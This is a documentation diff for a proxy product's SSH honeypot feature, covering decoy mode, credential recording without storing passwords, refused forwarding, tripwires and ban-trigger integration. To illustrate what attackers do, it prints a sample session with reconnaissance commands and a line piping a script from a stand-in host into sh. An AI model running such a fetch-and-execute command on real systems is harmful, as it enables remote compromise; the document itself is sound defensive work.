@@ -5463,6 +5463,107 @@ failed authentication are `ssh_denied` deny events, so bans apply, and
 a file the scanner refuses is an `sftp_icap` observation on the ban
 ladder.
 
+#### server.listeners[].ssh.deception
+
+A bastion that is not there.
+
+Port 22 on a public address is scanned continuously, and what scans it is not a
+dictionary of default device credentials the way port 23's is: it is a list of
+**account names an estate actually uses** — `git`, `jenkins`, `postgres`,
+`deploy`, `ansible`, `ubuntu`, `oracle` — tried with a handful of passwords each,
+and a key offered first in case one happens to be trusted.
+
+Refusing tells you an address tried. Answering tells you *which account names this
+estate looks like it has from outside*, which of its passwords are in circulation,
+and then what the session came to do:
+
+```
+uname -a ; cat /proc/cpuinfo          what am I on
+crontab -l ; cat ~/.ssh/authorized_keys   what is here already
+curl -s http://198.51.100.9/i.sh | sh  and here is the payload
+```
+
+```yaml
+ssh:
+  # A honeypot: no upstream, and no authorized_keys, because there is
+  # nobody real to let in.
+  host_keys: [/etc/xproxy/decoy_host_ed25519]
+  deception:
+    mode: decoy
+    profile: linux
+    hostname: build-03      # something this estate really has
+    attempts: 2
+```
+
+| Key | Type | Default | Description |
+|-----|------|---------|-------------|
+| `enabled` | bool | `true` | Turns the section off without removing it |
+| `mode` | `answer`, `decoy` | `answer` | `answer`: a credential this listener refused gets the fabrication instead of a refusal. `decoy`: the whole listener is a fabricated bastion, with no `upstream` |
+| `clients` | list of CIDR | | The networks that get the fabrication. **Required in mode `answer`.** In mode `decoy` an empty list means every client |
+| `profile` | `linux`, `busybox` | `linux` | The machine being impersonated. `linux` is the default here because a server is what an SSH port fronts; the `telnet` trap defaults to `busybox` because a recorder is what is on port 23 |
+| `hostname` | string | the profile's | What a visitor reads in the shell prompt, `uname -a` and `/etc/hostname`. **Name it after something this estate really has** |
+| `attempts` | int | `1` | How many credentials are taken before the login is accepted (0 to 16, and no more than `max_auth_tries`, which is what the protocol lets a client try) |
+| `tripwire` | list | | Command names that raise an `ssh_tripwire` event. **In addition to** the built-in set documented under `telnet.deception` |
+| `seed` | int | from the listener name | Makes the fabricated numbers reproducible across restarts |
+| `period` | duration | `30s` | How long one sample of a fabricated number lasts |
+| `max_clients` | int | `1024` | Bounds the record of who has been answered |
+
+**In mode `answer` it adds no authentication method the listener did not already
+offer.** It wraps the callbacks that are there. A key-only bastion therefore
+collects key fingerprints and nothing else, because a bastion that started
+advertising password authentication when a deception section was added would have
+had its front door changed by a logging feature. Collecting passwords on purpose
+is what `mode: decoy` is for, on a listener of its own.
+
+**It replaces the refusals that happen after the proxy has spoken**: a refused
+credential, a failed or locked second factor, the estate's `authorization` policy,
+and a missing access grant. A **partial success** is not a refusal — RFC 4252
+partial success is the protocol saying that credential was right and another
+factor comes next — so the factor after it is asked for as usual, and only its
+refusal can be fabricated. It does not replace `allow_clients` or a ban, and it
+never replaces an *outage*: an operator working an incident must not be handed a
+fabricated machine instead of "the target is unavailable".
+
+**A key is never accepted.** On a decoy listener a public key is recorded by
+fingerprint and then refused, so the client falls back to a password as it would
+against a server that trusts no keys — and the password is what a trap on port 22
+is for. A visitor let in on a key would have proved only that it holds one.
+
+**No password is recorded, in any form a guess can be tested against**, exactly as
+under `telnet.deception`: the user name, the credential's **length**, and a
+`credential_id` computed under a key the process made at startup and never writes
+down. The login never turns on the credential either: every credential is accepted
+once `attempts` have been taken, because a trap that accepted the right password
+and refused the wrong one would be a credential oracle.
+
+**Nothing is forwarded.** `direct-tcpip` is a client asking to use this proxy as a
+relay and `tcpip-forward` is the same request from the other direction; both are
+refused, and both are tripwires, because an open relay would put this estate's
+address on somebody else's work. `x11` the same. A `subsystem` request — sftp, and
+so an upload rather than a fetch — is refused too: there is no fabricated file
+system to put a payload in.
+
+**Nothing is run and nothing is fetched**, and the fabricated file system has the
+same refusals to invent as the telnet one: `/etc/shadow` lists accounts with `*`
+where a hash would be, `/tmp` is empty, and the shell history is empty.
+
+**A `decoy` listener will not compile with `upstream`, `mfa` or `require_grant`**,
+and it does not need `authorized_keys`, `users_file`, `trusted_user_ca_keys`,
+`upstream_key_file` or `upstream_known_hosts` — there is no machine to authenticate
+to and nobody real to let in. It still needs `host_keys`, because a client pins
+one. Use a host key that is **not** a real bastion's.
+
+A session is bounded in commands as well as by the listener's timeouts, so a script
+in a loop cannot hold a worker on a listener whose whole purpose is to be found.
+
+Counters: `ssh_deceived` and `ssh_tripwire`; the refusal counters still move, so
+`ssh_auth_failed` and the `auth_failed` deny events say what happened even where
+the client was told it got in. Security events: `ssh_credential` (the user name,
+the length, the handle, the client version, and for a key its fingerprint),
+`ssh_deceived` and `ssh_tripwire`. `ssh_tripwire` is nameable in a ban trigger's
+`reasons`; the ordinary fabricated exchange is not, because banning it would end
+the collection. `xproxyctl decoys` lists what each fabrication has seen.
+
 ### server.listeners[].h3
 
 | Key | Type | Default | Description |
@@ -7009,7 +7110,7 @@ comes from a trusted proxy chain or `action` is `reject`.
 | Key | Type | Default | Description |
 |-----|------|---------|-------------|
 | `name` | name | required, unique | Appears in the ban entry as `trigger:<name>` |
-| `reasons` | list | `[]` (all) | Deny categories that count: `acl`, `rate_limit`, `waf`, `body_size`, `uri_length`, `bad_host`, `no_route`, `websocket`, `concurrency`, `challenge`, `jwt`, `icap`, `geo`, `tcp_no_route`, `forward_denied`, `forward_auth`, `honeypot`, `dns_blocked`, `dns_bogus`, `dns_rpz`, `honeytoken`, `account_abuse`, `api_abuse`, `threat_intel`, `scim`, `smtp_denied`, `mqtt_denied`, `ssh_denied`, `ftp_denied`, `syslog_denied`, `telnet_denied`, `vnc_denied`, `rdp_denied`, `forward_sni_mismatch`, `dns_tunnel`, `dns_answer_denied`, `sftp_icap`, `tcp_denied`, `udp_denied`, `modbus_denied`, `iec104_denied`, `snmp_denied`, `ldap_denied`, `tftp_denied`, `dhcp_denied`, `postgres_denied`, `mysql_denied`, `tds_denied`, `redis_denied`, `bacnet_denied`, `amqp_denied`, `s7_denied`, `ntp_denied`, `ntske_denied`, `dns_denied`, `dns_threat_intel`, `dns_deceived`, `dns_tripwire`, `telnet_tripwire`, `yara` |
+| `reasons` | list | `[]` (all) | Deny categories that count: `acl`, `rate_limit`, `waf`, `body_size`, `uri_length`, `bad_host`, `no_route`, `websocket`, `concurrency`, `challenge`, `jwt`, `icap`, `geo`, `tcp_no_route`, `forward_denied`, `forward_auth`, `honeypot`, `dns_blocked`, `dns_bogus`, `dns_rpz`, `honeytoken`, `account_abuse`, `api_abuse`, `threat_intel`, `scim`, `smtp_denied`, `mqtt_denied`, `ssh_denied`, `ftp_denied`, `syslog_denied`, `telnet_denied`, `vnc_denied`, `rdp_denied`, `forward_sni_mismatch`, `dns_tunnel`, `dns_answer_denied`, `sftp_icap`, `tcp_denied`, `udp_denied`, `modbus_denied`, `iec104_denied`, `snmp_denied`, `ldap_denied`, `tftp_denied`, `dhcp_denied`, `postgres_denied`, `mysql_denied`, `tds_denied`, `redis_denied`, `bacnet_denied`, `amqp_denied`, `s7_denied`, `ntp_denied`, `ntske_denied`, `dns_denied`, `dns_threat_intel`, `dns_deceived`, `dns_tripwire`, `telnet_tripwire`, `ssh_tripwire`, `yara` |
 | `threshold` | int | required | Denies within `window` that trigger the ban |
 | `window` | duration | required | At most 24h |
 | `duration` | duration | required | First ban length |
